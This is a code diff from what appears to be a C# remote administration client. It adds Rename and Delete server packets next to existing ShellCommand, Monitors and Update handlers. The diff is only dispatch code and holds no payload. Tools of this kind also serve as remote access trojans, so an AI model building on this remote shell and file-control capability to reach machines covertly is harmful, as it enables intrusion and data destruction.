@@ -82,6 +82,8 @@ static class Program
                 typeof(Core.Packets.ServerPackets.Update),
                 typeof(Core.Packets.ServerPackets.Monitors),
                 typeof(Core.Packets.ServerPackets.ShellCommand),
+                typeof(Core.Packets.ServerPackets.Rename),
+                typeof(Core.Packets.ServerPackets.Delete),
                 typeof(Core.Packets.ClientPackets.Initialize),
                 typeof(Core.Packets.ClientPackets.Status),
                 typeof(Core.Packets.ClientPackets.UserStatus),
@@ -235,6 +237,14 @@ static class Program
         else if (type == typeof(Core.Packets.ServerPackets.ShellCommand))
         {
             CommandHandler.HandleShellCommand((Core.Packets.ServerPackets.ShellCommand)packet, client);
+        }
+        else if (type == typeof(Core.Packets.ServerPackets.Rename))
+        {
+            CommandHandler.HandleRename((Core.Packets.ServerPackets.Rename)packet, client);
+        }
+        else if (type == typeof(Core.Packets.ServerPackets.Delete))
+        {
+            CommandHandler.HandleDelete((Core.Packets.ServerPackets.Delete)packet, client);
         }
     }
 }
